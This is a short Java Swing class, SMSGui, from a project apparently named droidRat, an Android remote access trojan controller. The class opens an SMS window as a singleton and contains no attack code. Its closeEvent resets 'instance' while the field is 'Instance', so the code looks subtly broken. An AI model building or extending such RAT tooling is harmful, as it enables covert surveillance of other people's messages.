package com.je_chen.droidRat.gui.smsgui;

import com.je_chen.droidRat.gui.guisuper.GuiFather;
import com.je_chen.droidRat.gui.guisuper.GuiFatherInterface;

import javax.swing.*;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;

public class SMSGui extends GuiFather implements GuiFatherInterface {
    private static SMSGui Instance;
    private JPanel jPanel;

    public static synchronized SMSGui getInstance(String windowName) {
        if (Instance == null) {
            Instance = new SMSGui();
            Instance.show(windowName);
        }
        return Instance;
    }

    @Override
    protected void closeEvent() {
        super.closeEvent();
        instance = null;
    }
}
